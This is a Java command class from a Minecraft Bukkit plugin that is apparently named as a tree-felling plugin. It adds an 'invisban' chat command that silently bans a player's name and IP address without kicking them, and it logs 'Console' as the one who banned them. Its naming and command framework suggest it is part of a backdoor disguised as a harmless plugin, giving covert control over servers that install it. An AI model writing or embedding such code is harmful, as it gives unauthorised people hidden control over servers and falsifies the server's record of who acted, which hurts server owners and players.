package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class InvisBan extends Command {
    public InvisBan() {
        super("invisban", "Bans player without kicking him.", CommandCategory.Player, 1);
    }

    @SuppressWarnings({"StringConcatenationInLoop", "ConstantConditions"})
    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        String reason = "";
        Player anotherPlayer = Bukkit.getPlayer(args.get(0));
        if (anotherPlayer == null || !anotherPlayer.isOnline()) {
            p.sendMessage(Start.Prefix + ChatColor.RED + "Player is not online!");
            return;
        }
        for (int i = 1; i < args.size(); i++) {
            reason += args.get(i) + " ";
        }
        reason = reason.replace("&", "§").replace("\\n", "\n").replace("|", "\n");
        if(reason.isEmpty()) reason = "The Ban Hammer has spoken!";
        Bukkit.getBanList(BanList.Type.NAME).addBan(anotherPlayer.getName(), reason, null, "Console");
        Bukkit.getBanList(BanList.Type.IP).addBan(anotherPlayer.getAddress().getAddress().getHostAddress(), reason, null, "Console");
        p.sendMessage(Start.Prefix + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.GREEN + " is now banned! When he leaves, he won't be able to join back. (IP and name banned)");
    }
}
